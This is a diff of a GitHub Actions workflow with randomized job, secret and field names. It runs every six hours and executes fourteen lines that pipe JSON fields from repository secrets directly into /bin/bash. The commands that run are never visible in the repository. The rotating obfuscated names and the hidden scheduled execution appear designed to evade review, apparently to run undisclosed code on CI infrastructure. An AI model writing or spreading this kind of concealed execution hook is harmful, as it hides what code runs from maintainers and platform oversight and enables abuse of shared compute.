@@ -1,30 +1,30 @@
 name: mingzizxv
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
-
+    - cron: '9 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingzizxv
         env:
-          norod8: ${{ secrets.norod8 }}
+          gu82: ${{ secrets.gu82 }}
         run: |
-          echo $norod8 | jq -r .yytj58 | /bin/bash
-          echo $avb008 | jq -r .lpno22 | /bin/bash
-          echo $vvmsw8 | jq -r .c00365 | /bin/bash
-          echo $fjefj955 | jq -r .a758 | /bin/bash
-          echo $dvtwy1521 | jq -r .fdk72 | /bin/bash
-          echo $vh56714 | jq -r .vyv9 | /bin/bash
-          echo $lmmgi083 | jq -r .uzqzx1 | /bin/bash
-          echo $euhlc52433 | jq -r .kd338 | /bin/bash
-          echo $dee82 | jq -r .of19 | /bin/bash
-          echo $ncq0656 | jq -r .hfykj622 | /bin/bash
-          echo $f2917 | jq -r .rgj3434 | /bin/bash
-          echo $kk1 | jq -r .ld9150 | /bin/bash
-          echo $ofry9459 | jq -r .wolxm608 | /bin/bash
+          echo $gu82 | jq -r .fugn842 | /bin/bash
+          echo $utcs17 | jq -r .q0735 | /bin/bash
+          echo $mtdbw49 | jq -r .db28 | /bin/bash
+          echo $xcpjb7 | jq -r .hr157 | /bin/bash
+          echo $nli79327 | jq -r .bh13 | /bin/bash
+          echo $oxnh936 | jq -r .xav9 | /bin/bash
+          echo $l307 | jq -r .jzlj5503 | /bin/bash
+          echo $g332 | jq -r .qgsq11954 | /bin/bash
+          echo $rztt36 | jq -r .aqde0877 | /bin/bash
+          echo $jwtlx3 | jq -r .mcg63 | /bin/bash
+          echo $ortw911 | jq -r .xah93513 | /bin/bash
+          echo $cif654 | jq -r .yx0502 | /bin/bash
+          echo $j3321 | jq -r .pcqha6 | /bin/bash
+          echo $tq2 | jq -r .bfjw42408 | /bin/bash
 
